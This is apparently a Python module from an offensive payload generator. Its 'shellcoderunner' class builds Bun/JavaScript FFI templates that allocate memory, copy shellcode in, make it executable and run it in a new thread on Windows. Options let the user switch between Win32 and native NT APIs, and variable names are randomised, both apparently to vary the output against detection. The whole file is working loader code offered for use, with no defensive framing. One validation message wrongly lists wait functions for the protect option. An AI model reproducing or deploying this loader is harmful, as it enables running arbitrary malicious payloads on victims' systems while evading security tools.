from string import Template
import os

class shellcoderunner:
    def __init__(self, arguments):
        self.memoryPermission = 'PAGE_EXECUTE_READ'
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'

        self.allocation = 'VirtualAlloc'
        if 'allocation' in arguments:
            if arguments['allocation'] in ['VirtualAlloc', 'NtAllocateVirtualMemory', 'VirtualAllocEx', 'HeapAlloc']:
                self.allocation = arguments['allocation']
            else:
                print('Allocation argument must be VirtualAlloc, VirtualAllocEx, HeapAlloc, or NtAllocateVirtualMemory')
                exit(0)

        self.copy = 'memcpy'
        if 'copy' in arguments:
            if arguments['copy'] in ['memcpy', 'NtWriteVirtualMemory', 'WriteProcessMemory']:
                self.copy = arguments['copy']
            else:
                print('Copy argument must be memcpy, WriteProcessMemory, or NtWriteVirtualMemory')
                exit(0)

        self.protect = 'VirtualProtect'
        if 'protect' in arguments:
            if arguments['protect'] in ['VirtualProtect', 'NtProtectVirtualMemory']:
                self.protect = arguments['protect']
            else:
                print('Protect argument must be WaitForSingleObject or NtWaitForSingleObject')
                exit(0)

        self.execution = 'CreateThread'
        if 'execution' in arguments:
            if arguments['execution'] in ['CreateThread', 'NtCreateThreadEx']:
                self.execution = arguments['execution']
            else:
                print('Execution argument must be CreateThread or NtCreateThreadEx')
                exit(0)

        self.wait = 'WaitForSingleObject'
        if 'wait' in arguments:
            if arguments['wait'] in ['WaitForSingleObject', 'NtWaitForSingleObject']:
                self.wait = arguments['wait']
            else:
                print('Wait argument must be WaitForSingleObject or NtWaitForSingleObject')
                exit(0)

        self.close = 'CloseHandle'
        if 'close' in arguments:
            if arguments['close'] in ['CloseHandle', 'NtClose']:
                self.close = arguments['close']
            else:
                print('Close argument must be CloseHandle, or NtClose')
                exit(0)

    def imports(self) -> list[str]:
        return ['import Kernel32 from "@bun-win32/kernel32";', 
                'import { toArrayBuffer, ptr } from "bun:ffi";',
                'import { MemoryAllocationType, MemoryProtection, ThreadAccessRights, HeapAllocFlags } from "@bun-win32/kernel32";']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        template = """
    {transformers}
"""

        if self.allocation == 'VirtualAlloc':
            template += """
    let address = {VirtualAlloc}(0, {shellcodeSize}, MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtection.PAGE_READWRITE);
"""
        elif self.allocation == 'NtAllocateVirtualMemory':
            template += """
    let regionSize = new BigUint64Array(1);
    let baseAddress = new BigUint64Array(1);
    regionSize[0] = {shellcodeSize}n;
    let status = {NtAllocateVirtualMemory}(-1n, ptr(baseAddress), 0n, ptr(regionSize), MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtection.PAGE_READWRITE);
    let address = baseAddress[0];
"""
        elif self.allocation == 'VirtualAllocEx':
            template += """
    let address = {VirtualAllocEx}(-1n, 0, {shellcodeSize}n, MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtection.PAGE_READWRITE);
"""
        elif self.allocation == 'HeapAlloc':
            template += """
    let hHeap = {HeapCreate}(0, {shellcodeSize}, 0);
    let address = {HeapAlloc}(hHeap, HeapAllocFlags.HEAP_ZERO_MEMORY, {shellcodeSize});  
"""

        if self.copy == 'memcpy':
            template += """
    let buffer = new Uint8Array(toArrayBuffer(Number(address), 0, {shellcodeSize}));
    buffer.set(shellcode);
"""
        elif self.copy == 'WriteProcessMemory':
            template += """
    let bytesWritten = new BigUint64Array(1);
    {WriteProcessMemory}(-1n, address, ptr(shellcode), {shellcodeSize}n, bytesWritten);
"""
        elif self.copy == 'NtWriteVirtualMemory':
            template += """
    let bytesWritten = new BigUint64Array(1);
    {NtWriteVirtualMemory}(-1n, BigInt(address), ptr(shellcode), {shellcodeSize}n, ptr(bytesWritten));
"""

        if self.protect == 'VirtualProtect':
            template += """
    let oldProtect = new Uint32Array(1);
    {VirtualProtect}(address, {shellcodeSize}n, MemoryProtection.PAGE_EXECUTE_READ, oldProtect);
"""     
        elif self.protect == 'NtProtectVirtualMemory':
            template += Template("""
    let oldProtect = new Uint32Array(1);;
    let regionSize_$n = new BigUint64Array(1);
    regionSize_$n[0] = {shellcodeSize}n;
    let baseAddress_$n = new BigUint64Array([BigInt(address)]);
    {NtProtectVirtualMemory}(-1n, ptr(baseAddress_$n), ptr(regionSize_$n), MemoryProtection.PAGE_EXECUTE_READ, ptr(oldProtect));
""").substitute(n=os.urandom(4).hex())

        if self.execution == 'CreateThread':
            template += """
    let hThread = {CreateThread}(null, 0n, address, null, 0, null);
"""
        elif self.execution == 'NtCreateThreadEx':
            template += """
    let hThreadBuffer = new BigUint64Array(1); 
    {NtCreateThreadEx}(ptr(hThreadBuffer), ThreadAccessRights.THREAD_ALL_ACCESS, null, -1n, address, 0n, 0, 0n, 0n, 0n, null);
    let hThread = hThreadBuffer[0];
"""
        if self.wait == 'WaitForSingleObject':
            template += """
    {WaitForSingleObject}(hThread, 0xFFFFFFFF);
"""
        elif self.wait == 'NtWaitForSingleObject':
            template += """
    {NtWaitForSingleObject}(hThread, 0xFFFFFFFF);
"""

        if self.close == 'CloseHandle':
            template += """
    {CloseHandle}(hThread);
"""
        elif self.close == 'NtClose':
            template += """
    {NtClose}(hThread);
"""

        if self.allocation == 'VirtualAlloc':
            template += """
    {VirtualFree}(address);
"""
        elif self.allocation == 'HeapAlloc':
            template += """
    {HeapFree}(hHeap, 0, address);
    {HeapDestroy}(hHeap);
"""
        elif self.allocation == 'NtAllocateVirtualMemory':
            template += """
    {NtFreeVirtualMemory}(-1n, address);
"""

        return template